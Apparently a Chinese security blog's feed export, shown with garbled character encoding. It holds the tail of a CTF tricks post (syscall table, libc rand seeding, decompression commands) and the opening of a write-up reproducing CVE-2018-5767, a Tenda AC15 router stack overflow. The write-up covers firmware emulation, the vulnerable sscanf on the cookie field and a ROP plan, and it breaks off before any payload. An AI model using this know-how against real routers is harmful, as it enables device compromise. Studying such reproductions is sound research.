r><tr><td>114</td><td>setregid</td><td>sys_setregid</td></tr><tr><td>115</td><td>getgroups</td><td>sys_getgroups</td></tr><tr><td>116</td><td>setgroups</td><td>sys_setgroups</td></tr><tr><td>117</td><td>setresuid</td><td>sys_setresuid</td></tr><tr><td>118</td><td>getresuid</td><td>sys_getresuid</td></tr><tr><td>119</td><td>setresgid</td><td>sys_setresgid</td></tr><tr><td>120</td><td>getresgid</td><td>sys_getresgid</td></tr><tr><td>121</td><td>getpgid</td><td>sys_getpgid</td></tr><tr><td>122</td><td>setfsuid</td><td>sys_setfsuid</td></tr><tr><td>123</td><td>setfsgid</td><td>sys_setfsgid</td></tr><tr><td>124</td><td>getsid</td><td>sys_getsid</td></tr><tr><td>125</td><td>capget</td><td>sys_capget</td></tr><tr><td>126</td><td>capset</td><td>sys_capset</td></tr><tr><td>127</td><td>rt_sigpending</td><td>sys_rt_sigpending</td></tr><tr><td>128</td><td>rt_sigtimedwait</td><td>sys_rt_sigtimedwait</td></tr><tr><td>129</td><td>rt_sigqueueinfo</td><td>sys_rt_sigqueueinfo</td></tr><tr><td>130</td><td>rt_sigsuspend</td><td>sys_rt_sigsuspend</td></tr><tr><td>131</td><td>sigaltstack</td><td>sys_sigaltstack</td></tr><tr><td>132</td><td>utime</td><td>sys_utime</td></tr><tr><td>133</td><td>mknod</td><td>sys_mknod</td></tr><tr><td>134</td><td>uselib</td><td></td></tr><tr><td>135</td><td>personality</td><td>sys_personality</td></tr><tr><td>136</td><td>ustat</td><td>sys_ustat</td></tr><tr><td>137</td><td>statfs</td><td>sys_statfs</td></tr><tr><td>138</td><td>fstatfs</td><td>sys_fstatfs</td></tr><tr><td>139</td><td>sysfs</td><td>sys_sysfs</td></tr><tr><td>140</td><td>getpriority</td><td>sys_getpriority</td></tr><tr><td>141</td><td>setpriority</td><td>sys_setpriority</td></tr><tr><td>142</td><td>sched_setparam</td><td>sys_sched_setparam</td></tr><tr><td>143</td><td>sched_getparam</td><td>sys_sched_getparam</td></tr><tr><td>144</td><td>sched_setscheduler</td><td>sys_sched_setscheduler</td></tr><tr><td>145</td><td>sched_getscheduler</td><td>sys_sched_getscheduler</td></tr><tr><td>146</td><td>sched_get_priority_max</td><td>sys_sched_get_priority_max</td></tr><tr><td>147</td><td>sched_get_priority_min</td><td>sys_sched_get_priority_min</td></tr><tr><td>148</td><td>sched_rr_get_interval</td><td>sys_sched_rr_get_interval</td></tr><tr><td>149</td><td>mlock</td><td>sys_mlock</td></tr><tr><td>150</td><td>munlock</td><td>sys_munlock</td></tr><tr><td>151</td><td>mlockall</td><td>sys_mlockall</td></tr><tr><td>152</td><td>munlockall</td><td>sys_munlockall</td></tr><tr><td>153</td><td>vhangup</td><td>sys_vhangup</td></tr><tr><td>154</td><td>modify_ldt</td><td>sys_modify_ldt</td></tr><tr><td>155</td><td>pivot_root</td><td>sys_pivot_root</td></tr><tr><td>156</td><td>_sysctl</td><td>sys_sysctl</td></tr><tr><td>157</td><td>prctl</td><td>sys_prctl</td></tr><tr><td>158</td><td>arch_prctl</td><td>sys_arch_prctl</td></tr><tr><td>159</td><td>adjtimex</td><td>sys_adjtimex</td></tr><tr><td>160</td><td>setrlimit</td><td>sys_setrlimit</td></tr><tr><td>161</td><td>chroot</td><td>sys_chroot</td></tr><tr><td>162</td><td>sync</td><td>sys_sync</td></tr><tr><td>163</td><td>acct</td><td>sys_acct</td></tr><tr><td>164</td><td>settimeofday</td><td>sys_settimeofday</td></tr><tr><td>165</td><td>mount</td><td>sys_mount</td></tr><tr><td>166</td><td>umount2</td><td>sys_umount</td></tr><tr><td>167</td><td>swapon</td><td>sys_swapon</td></tr><tr><td>168</td><td>swapoff</td><td>sys_swapoff</td></tr><tr><td>169</td><td>reboot</td><td>sys_reboot</td></tr><tr><td>170</td><td>sethostname</td><td>sys_sethostname</td></tr><tr><td>171</td><td>setdomainname</td><td>sys_setdomainname</td></tr><tr><td>172</td><td>iopl</td><td>stub_iopl</td></tr><tr><td>173</td><td>ioperm</td><td>sys_ioperm</td></tr><tr><td>174</td><td>create_module</td><td></td></tr><tr><td>175</td><td>init_module</td><td>sys_init_module</td></tr><tr><td>176</td><td>delete_module</td><td>sys_delete_module</td></tr><tr><td>177</td><td>get_kernel_syms</td><td></td></tr><tr><td>178</td><td>query_module</td><td></td></tr><tr><td>179</td><td>quotactl</td><td>sys_quotactl</td></tr><tr><td>180</td><td>nfsservctl</td><td></td></tr><tr><td>181</td><td>getpmsg</td><td></td></tr><tr><td>182</td><td>putpmsg</td><td></td></tr><tr><td>183</td><td>afs_syscall</td><td></td></tr><tr><td>184</td><td>tuxcall</td><td></td></tr><tr><td>185</td><td>security</td><td></td></tr><tr><td>186</td><td>gettid</td><td>sys_gettid</td></tr><tr><td>187</td><td>readahead</td><td>sys_readahead</td></tr><tr><td>188</td><td>setxattr</td><td>sys_setxattr</td></tr><tr><td>189</td><td>lsetxattr</td><td>sys_lsetxattr</td></tr><tr><td>190</td><td>fsetxattr</td><td>sys_fsetxattr</td></tr><tr><td>191</td><td>getxattr</td><td>sys_getxattr</td></tr><tr><td>192</td><td>lgetxattr</td><td>sys_lgetxattr</td></tr><tr><td>193</td><td>fgetxattr</td><td>sys_fgetxattr</td></tr><tr><td>194</td><td>listxattr</td><td>sys_listxattr</td></tr><tr><td>195</td><td>llistxattr</td><td>sys_llistxattr</td></tr><tr><td>196</td><td>flistxattr</td><td>sys_flistxattr</td></tr><tr><td>197</td><td>removexattr</td><td>sys_removexattr</td></tr><tr><td>198</td><td>lremovexattr</td><td>sys_lremovexattr</td></tr><tr><td>199</td><td>fremovexattr</td><td>sys_fremovexattr</td></tr><tr><td>200</td><td>tkill</td><td>sys_tkill</td></tr><tr><td>201</td><td>time</td><td>sys_time</td></tr><tr><td>202</td><td>futex</td><td>sys_futex</td></tr><tr><td>203</td><td>sched_setaffinity</td><td>sys_sched_setaffinity</td></tr><tr><td>204</td><td>sched_getaffinity</td><td>sys_sched_getaffinity</td></tr><tr><td>205</td><td>set_thread_area</td><td></td></tr><tr><td>206</td><td>io_setup</td><td>sys_io_setup</td></tr><tr><td>207</td><td>io_destroy</td><td>sys_io_destroy</td></tr><tr><td>208</td><td>io_getevents</td><td>sys_io_getevents</td></tr><tr><td>209</td><td>io_submit</td><td>sys_io_submit</td></tr><tr><td>210</td><td>io_cancel</td><td>sys_io_cancel</td></tr><tr><td>211</td><td>get_thread_area</td><td></td></tr><tr><td>212</td><td>lookup_dcookie</td><td>sys_lookup_dcookie</td></tr><tr><td>213</td><td>epoll_create</td><td>sys_epoll_create</td></tr><tr><td>214</td><td>epoll_ctl_old</td><td></td></tr><tr><td>215</td><td>epoll_wait_old</td><td></td></tr><tr><td>216</td><td>remap_file_pages</td><td>sys_remap_file_pages</td></tr><tr><td>217</td><td>getdents64</td><td>sys_getdents64</td></tr><tr><td>218</td><td>set_tid_address</td><td>sys_set_tid_address</td></tr><tr><td>219</td><td>restart_syscall</td><td>sys_restart_syscall</td></tr><tr><td>220</td><td>semtimedop</td><td>sys_semtimedop</td></tr><tr><td>221</td><td>fadvise64</td><td>sys_fadvise64</td></tr><tr><td>222</td><td>timer_create</td><td>sys_timer_create</td></tr><tr><td>223</td><td>timer_settime</td><td>sys_timer_settime</td></tr><tr><td>224</td><td>timer_gettime</td><td>sys_timer_gettime</td></tr><tr><td>225</td><td>timer_getoverrun</td><td>sys_timer_getoverrun</td></tr><tr><td>226</td><td>timer_delete</td><td>sys_timer_delete</td></tr><tr><td>227</td><td>clock_settime</td><td>sys_clock_settime</td></tr><tr><td>228</td><td>clock_gettime</td><td>sys_clock_gettime</td></tr><tr><td>229</td><td>clock_getres</td><td>sys_clock_getres</td></tr><tr><td>230</td><td>clock_nanosleep</td><td>sys_clock_nanosleep</td></tr><tr><td>231</td><td>exit_group</td><td>sys_exit_group</td></tr><tr><td>232</td><td>epoll_wait</td><td>sys_epoll_wait</td></tr><tr><td>233</td><td>epoll_ctl</td><td>sys_epoll_ctl</td></tr><tr><td>234</td><td>tgkill</td><td>sys_tgkill</td></tr><tr><td>235</td><td>utimes</td><td>sys_utimes</td></tr><tr><td>236</td><td>vserver</td><td></td></tr><tr><td>237</td><td>mbind</td><td>sys_mbind</td></tr><tr><td>238</td><td>set_mempolicy</td><td>sys_set_mempolicy</td></tr><tr><td>239</td><td>get_mempolicy</td><td>sys_get_mempolicy</td></tr><tr><td>240</td><td>mq_open</td><td>sys_mq_open</td></tr><tr><td>241</td><td>mq_unlink</td><td>sys_mq_unlink</td></tr><tr><td>242</td><td>mq_timedsend</td><td>sys_mq_timedsend</td></tr><tr><td>243</td><td>mq_timedreceive</td><td>sys_mq_timedreceive</td></tr><tr><td>244</td><td>mq_notify</td><td>sys_mq_notify</td></tr><tr><td>245</td><td>mq_getsetattr</td><td>sys_mq_getsetattr</td></tr><tr><td>246</td><td>kexec_load</td><td>sys_kexec_load</td></tr><tr><td>247</td><td>waitid</td><td>sys_waitid</td></tr><tr><td>248</td><td>add_key</td><td>sys_add_key</td></tr><tr><td>249</td><td>request_key</td><td>sys_request_key</td></tr><tr><td>250</td><td>keyctl</td><td>sys_keyctl</td></tr><tr><td>251</td><td>ioprio_set</td><td>sys_ioprio_set</td></tr><tr><td>252</td><td>ioprio_get</td><td>sys_ioprio_get</td></tr><tr><td>253</td><td>inotify_init</td><td>sys_inotify_init</td></tr><tr><td>254</td><td>inotify_add_watch</td><td>sys_inotify_add_watch</td></tr><tr><td>255</td><td>inotify_rm_watch</td><td>sys_inotify_rm_watch</td></tr><tr><td>256</td><td>migrate_pages</td><td>sys_migrate_pages</td></tr><tr><td>257</td><td>openat</td><td>sys_openat</td></tr><tr><td>258</td><td>mkdirat</td><td>sys_mkdirat</td></tr><tr><td>259</td><td>mknodat</td><td>sys_mknodat</td></tr><tr><td>260</td><td>fchownat</td><td>sys_fchownat</td></tr><tr><td>261</td><td>futimesat</td><td>sys_futimesat</td></tr><tr><td>262</td><td>newfstatat</td><td>sys_newfstatat</td></tr><tr><td>263</td><td>unlinkat</td><td>sys_unlinkat</td></tr><tr><td>264</td><td>renameat</td><td>sys_renameat</td></tr><tr><td>265</td><td>linkat</td><td>sys_linkat</td></tr><tr><td>266</td><td>symlinkat</td><td>sys_symlinkat</td></tr><tr><td>267</td><td>readlinkat</td><td>sys_readlinkat</td></tr><tr><td>268</td><td>fchmodat</td><td>sys_fchmodat</td></tr><tr><td>269</td><td>faccessat</td><td>sys_faccessat</td></tr><tr><td>270</td><td>pselect6</td><td>sys_pselect6</td></tr><tr><td>271</td><td>ppoll</td><td>sys_ppoll</td></tr><tr><td>272</td><td>unshare</td><td>sys_unshare</td></tr><tr><td>273</td><td>set_robust_list</td><td>sys_set_robust_list</td></tr><tr><td>274</td><td>get_robust_list</td><td>sys_get_robust_list</td></tr><tr><td>275</td><td>splice</td><td>sys_splice</td></tr><tr><td>276</td><td>tee</td><td>sys_tee</td></tr><tr><td>277</td><td>sync_file_range</td><td>sys_sync_file_range</td></tr><tr><td>278</td><td>vmsplice</td><td>sys_vmsplice</td></tr><tr><td>279</td><td>move_pages</td><td>sys_move_pages</td></tr><tr><td>280</td><td>utimensat</td><td>sys_utimensat</td></tr><tr><td>281</td><td>epoll_pwait</td><td>sys_epoll_pwait</td></tr><tr><td>282</td><td>signalfd</td><td>sys_signalfd</td></tr><tr><td>283</td><td>timerfd_create</td><td>sys_timerfd_create</td></tr><tr><td>284</td><td>eventfd</td><td>sys_eventfd</td></tr><tr><td>285</td><td>fallocate</td><td>sys_fallocate</td></tr><tr><td>286</td><td>timerfd_settime</td><td>sys_timerfd_settime</td></tr><tr><td>287</td><td>timerfd_gettime</td><td>sys_timerfd_gettime</td></tr><tr><td>288</td><td>accept4</td><td>sys_accept4</td></tr><tr><td>289</td><td>signalfd4</td><td>sys_signalfd4</td></tr><tr><td>290</td><td>eventfd2</td><td>sys_eventfd2</td></tr><tr><td>291</td><td>epoll_create1</td><td>sys_epoll_create1</td></tr><tr><td>292</td><td>dup3</td><td>sys_dup3</td></tr><tr><td>293</td><td>pipe2</td><td>sys_pipe2</td></tr><tr><td>294</td><td>inotify_init1</td><td>sys_inotify_init1</td></tr><tr><td>295</td><td>preadv</td><td>sys_preadv</td></tr><tr><td>296</td><td>pwritev</td><td>sys_pwritev</td></tr><tr><td>297</td><td>rt_tgsigqueueinfo</td><td>sys_rt_tgsigqueueinfo</td></tr><tr><td>298</td><td>perf_event_open</td><td>sys_perf_event_open</td></tr><tr><td>299</td><td>recvmmsg</td><td>sys_recvmmsg</td></tr><tr><td>300</td><td>fanotify_init</td><td>sys_fanotify_init</td></tr><tr><td>301</td><td>fanotify_mark</td><td>sys_fanotify_mark</td></tr><tr><td>302</td><td>prlimit64</td><td>sys_prlimit64</td></tr><tr><td>303</td><td>name_to_handle_at</td><td>sys_name_to_handle_at</td></tr><tr><td>304</td><td>open_by_handle_at</td><td>sys_open_by_handle_at</td></tr><tr><td>305</td><td>clock_adjtime</td><td>sys_clock_adjtime</td></tr><tr><td>306</td><td>syncfs</td><td>sys_syncfs</td></tr><tr><td>307</td><td>sendmmsg</td><td>sys_sendmmsg</td></tr><tr><td>308</td><td>setns</td><td>sys_setns</td></tr><tr><td>309</td><td>getcpu</td><td>sys_getcpu</td></tr><tr><td>310</td><td>process_vm_readv</td><td>sys_process_vm_readv</td></tr><tr><td>311</td><td>process_vm_writev</td><td>sys_process_vm_writev</td></tr><tr><td>312</td><td>kcmp</td><td>sys_kcmp</td></tr><tr><td>313</td><td>finit_module</td><td>sys_finit_module</td></tr></tbody></table><h2 id="Python-è°ƒç”¨ç»™å®š-libc-ç¯å¢ƒçš„ç§å­-rand"><a href="#Python-è°ƒç”¨ç»™å®š-libc-ç¯å¢ƒçš„ç§å­-rand" class="headerlink" title="Python è°ƒç”¨ç»™å®š libc ç¯å¢ƒçš„ç§å­ rand"></a>Python è°ƒç”¨ç»™å®š libc ç¯å¢ƒçš„ç§å­ rand</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.srand(<span class="number">0x39</span>)</span><br><span class="line">rand_result = libc.rand()</span><br></pre></td></tr></table></figure><h2 id="linux-ä¸‹çš„è§£å‹æ–¹æ³•"><a href="#linux-ä¸‹çš„è§£å‹æ–¹æ³•" class="headerlink" title="linux ä¸‹çš„è§£å‹æ–¹æ³•"></a>linux ä¸‹çš„è§£å‹æ–¹æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*.tartar â€“xvf</span><br><span class="line">*.gzgzip -d æˆ– gunzip </span><br><span class="line">*.tar.gz/*.tgztar â€“xzf</span><br><span class="line">*.bz2bzip2 -d æˆ– bunzip2</span><br><span class="line">*.tar.bz2tar â€“xjf</span><br><span class="line">*.Zuncompress</span><br><span class="line">*.tar.Ztar â€“xZf </span><br><span class="line">*.rarunrar e</span><br><span class="line">*.zipunzip</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">å…³äºä¸åŒç‰ˆæœ¬ glibc æ›´æ¢çš„ä¸€äº›é—®é¢˜</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/114106118">pwné¢˜shellcodeæ”¶é›†</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ€»ç»“ä¸€äº›å¸¸ç”¨çš„æŠ€å·§ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="tricks" scheme="http://example.com/categories/ctf/tricks/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-5767å¤ç°</title>
    <link href="http://example.com/2023/01/18/CVE-2018-5767/"/>
    <id>http://example.com/2023/01/18/CVE-2018-5767/</id>
    <published>2023-01-18T12:29:07.000Z</published>
    <updated>2023-01-23T02:01:33.846Z</updated>
    
    <content type="html"><![CDATA[<p>è€ƒç ”æœŸé—´æƒ³å¤ç°çš„æ¼æ´ï¼Œç°åœ¨æŒ–å‡ºæ¥ç›˜ä¸€ä¸‹ã€‚</p><blockquote><p><a href="https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q">Tenda-AC15æ ˆæº¢å‡ºæ¼æ´(CVE-2018-5767)    by æ˜ŸæœŸäº”å®éªŒå®¤</a></p><p><a href="https://zhuanlan.zhihu.com/p/468018356">cve-2018-5767 è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´å¤ç°    by åˆå¤©ç½‘å®‰å®éªŒå®¤</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">CVE-2018-5767 å¤ç°åˆ†æ    by CataLpa</a></p></blockquote><span id="more"></span><h3 id="å¤ç°ç¯å¢ƒ"><a href="#å¤ç°ç¯å¢ƒ" class="headerlink" title="å¤ç°ç¯å¢ƒ"></a>å¤ç°ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 20.04</span><br><span class="line">IDA7.7</span><br><span class="line">GDBè°ƒè¯•å™¨</span><br><span class="line">Binwalkå›ºä»¶è§£åŒ…å·¥å…·</span><br><span class="line">è·¯ç”±å™¨å›ºä»¶ï¼šTenda AC15 15.03.1.16_multi</span><br></pre></td></tr></table></figure><p><a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">Tenda AC15 15.03.1.16_multiä¸‹è½½åœ°å€</a></p><p><a href="https://www.cnblogs.com/deerCode/p/12153248.html">sasquatchæŠ¥é”™é—®é¢˜è§£å†³</a></p><h3 id="å¤ç°å‡†å¤‡"><a href="#å¤ç°å‡†å¤‡" class="headerlink" title="å¤ç°å‡†å¤‡"></a>å¤ç°å‡†å¤‡</h3><ul><li><p>åˆ†ç¦»å›ºä»¶ç³»ç»Ÿ<code>binwalk -Me US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin</code>ï¼Œå¾—åˆ°æ‰«æä¿¡æ¯ã€‚</p></li><li><p>åˆ‡æ¢åˆ°<code>./~.extracted/squashfs-root</code>ï¼Œå¯ä»¥çœ‹åˆ°æå–å‡ºçš„æ–‡ä»¶ç³»ç»Ÿç›®å½•ï¼š</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  etc_ro  home  init  lib  mnt  proc  root  sbin  sys  tmp  usr  var  webroot  webroot_ro</span><br></pre></td></tr></table></figure><ul><li>åœ¨<code>/bin</code>ä¸‹çœ‹åˆ°äº†<code>busybox</code>æ–‡ä»¶ï¼Œä¾ç¨€è®°å¾—å“ªå¹´å›½èµ›æœ‰è§åˆ°è¿‡ï¼Œ<code>busybox</code>æ˜¯ä¸€ä¸ªé›†æˆäº†ä¸€ç™¾å¤šä¸ªå¸¸ç”¨Linuxå‘½ä»¤å’Œå·¥å…·çš„è½¯ä»¶ï¼Œåœ¨<code>åµŒå…¥å¼Linux</code>åº”ç”¨ä¸­ï¼Œ<code>busybox</code>åº”ç”¨éå¸¸å¹¿æ³›ï¼ŒåŒæ—¶å¤§å¤šæ•°<code>Linuxå‘è¡Œç‰ˆ</code>çš„å®‰è£…ç¨‹åºä¸­éƒ½å«æœ‰<code>busybox</code>ã€‚æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å…¶æ–‡ä»¶å¤´ä¿¡æ¯ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ readelf -h busybox </span><br><span class="line">ELF å¤´ï¼š</span><br><span class="line">  Magicï¼š   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  ç±»åˆ«:                              ELF32</span><br><span class="line">  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº (little endian)</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI ç‰ˆæœ¬:                          0</span><br><span class="line">  ç±»å‹:                              EXEC (å¯æ‰§è¡Œæ–‡ä»¶)</span><br><span class="line">  ç³»ç»Ÿæ¶æ„:                          ARM</span><br><span class="line">  ç‰ˆæœ¬:                              0x1</span><br><span class="line">  å…¥å£ç‚¹åœ°å€ï¼š               0xbeec</span><br><span class="line">  ç¨‹åºå¤´èµ·ç‚¹ï¼š          52 (bytes into file)</span><br><span class="line">  Start of section headers:          366736 (bytes into file)</span><br><span class="line">  æ ‡å¿—ï¼š             0x5000002, Version5 EABI, &lt;unknown&gt;</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         7</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         24</span><br><span class="line">  Section header string table index: 23</span><br></pre></td></tr></table></figure><ul><li>æˆ‘ä»¬é‡‡ç”¨<code>qemu</code>é…åˆ<code>chroot</code>æ¥å¯åŠ¨<code>/bin/httpd</code>ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line"><span class="built_in">cp</span> /usr/bin/qemu-arm-static .</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨åå‘ç°ç¨‹åºä¸€ç›´å¡åœ¨<code> Welcome to ...</code>ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/55814/9/22768/36236/63cb76a8F332e8710/76022a7a1563947d.png" style="zoom:80%;" /><ul><li>æŸ¥çœ‹æºç¨‹åºï¼Œå‘ç°æœ‰ä¸¤ä¸ªæ£€æŸ¥ï¼Œåœ¨<code>qemu</code>æ¨¡æ‹Ÿç¯å¢ƒä¸‹è¿æ¥ä¸åˆ°ç›¸å…³æœåŠ¡ï¼Œå› æ­¤<code>patch</code>æ‰ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/183742/15/31846/41397/63cb7716F4dcc06a7/efbc58270829d983.png" style="zoom:80%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check_networkï¼šæ£€æŸ¥ç½‘ç»œ</span><br><span class="line">ConnectCfmï¼šè¿æ¥æŸç§æœåŠ¡</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨ä¿®æ”¹åçš„<code>httpd</code>ï¼Œå‡ºç°äº†æ–°é—®é¢˜ï¼Œ<code>ip</code>åœ°å€ä¸æ˜¯æœ¬åœ°çš„ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/107512/5/34170/71762/63cb9cccF4863cd3a/252f16a530ff8205.png" style="zoom:80%;" /><ul><li>ç”±æ­¤éœ€è¦è‡ªè¡Œé…ç½®ç½‘æ¡¥<code>br0</code>åé‡æ–°æ‰§è¡Œï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo brctl addif br0 ens33</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo dhclient br0</span><br><span class="line">sudo <span class="built_in">chroot</span> ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/199991/3/31226/69926/63cba043Fc231d974/68a8d252030e3f18.png" style="zoom:80%;" /><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><ul><li>æ¼æ´ä½äº<code>R7WebsSecurityHandler</code>ä¸­ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/96405/27/36314/97172/63cba273Ff4595e2e/91d078e546898fe2.png" style="zoom:80%;" /><ul><li>å…ˆæ¥çœ‹çœ‹<code>sscanf</code>çš„ç”¨æ³•ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sscanf</span>(<span class="string">&quot;zhou456 hedf&quot;</span>, <span class="string">&quot;%[^ ]&quot;</span>, str); <span class="comment">//å–åˆ°æŒ‡å®šå­—ç¬¦ä¸ºæ­¢çš„å­—ç¬¦ä¸²,å–é‡åˆ°ç©ºæ ¼ä¸ºæ­¢å­—ç¬¦ä¸²    </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;str=%s\n&quot;</span>, str);  <span class="comment">//str=zhou456;</span></span><br></pre></td></tr></table></figure><p>å³å°†æºå­—ç¬¦ä¸²ä»¥ä¸€å®šå½¢å¼(æ­£åˆ™)è¯»å…¥åˆ°ç›®çš„å­—ç¬¦ä¸²ã€‚</p><ul><li><code>password</code>æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå®ƒæ˜¯<code>http</code>è¯·æ±‚ä¸­<code>cookie</code>ä¸Šçš„ä¸€ä¸ªå­—æ®µï¼Œä¹Ÿæ˜¯ä¼ªä»£ç ä¸­çš„<code>v40</code>ï¼Œè€Œ<code>v33</code>æ•°ç»„åªæœ‰<code>128</code>å¤§å°ï¼Œ<code>sscanf(v40, &quot;%*[^=]=%[^;];*&quot;, v33);</code>å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</li><li>æˆ‘ä»¬æ£€æŸ¥ä¸‹ä¿æŠ¤æœºåˆ¶ï¼Œé™¤äº†æ ˆä¸å¯æ‰§è¡Œï¼Œå…¶ä»–ä¿æŠ¤å‡æœªå¼€å¯ï¼Œå®¹æ˜“æƒ³åˆ°<code>ROP</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><ul><li>é¦–å…ˆæˆ‘ä»¬è¦è¿›å…¥æ¼æ´å‡½æ•°ï¼Œåªéœ€è®¿é—®å¦‚<code>/goform/anza</code>å³å¯ç»•è¿‡åˆ¤æ–­ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/203214/22/30645/24831/63cba72aFf1c6c343/6015d1ce1354bafa.png" alt="img" style="zoom:80%;" /><ul><li>è®¿é—®<code>http://&lt; ip &gt;/goform/anza</code>ï¼Œç”¨ç«ç‹é…åˆ<code>burpsuite</code>æŠ“ä¸ªåŒ…ï¼š</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/goform/anza</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.79.152</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: 